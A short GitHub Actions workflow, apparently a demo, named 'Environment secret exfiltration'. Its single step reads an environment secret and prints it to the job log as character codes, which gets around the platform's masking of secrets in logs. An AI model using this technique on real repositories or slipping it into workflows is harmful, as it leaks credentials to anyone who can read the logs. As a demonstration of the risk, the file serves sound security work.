name: Environment secret exfiltration

on:
  workflow_dispatch:

jobs:
  reveal-environment-secret:
    name: Reveal demo environment secret
    runs-on: ubuntu-latest
    environment:
      name: demo-environment
    steps:
      - name: Print environment secret
        env:
          DEMO_ENV_SECRET: ${{ secrets.DEMO_ENV_SECRET }}
        run: |
          python - <<'PY'
import os
secret = os.environ['DEMO_ENV_SECRET']
print('Demo environment secret length:', len(secret))
print('Demo environment secret (char codes):', ','.join(str(ord(ch)) for ch in secret))
PY
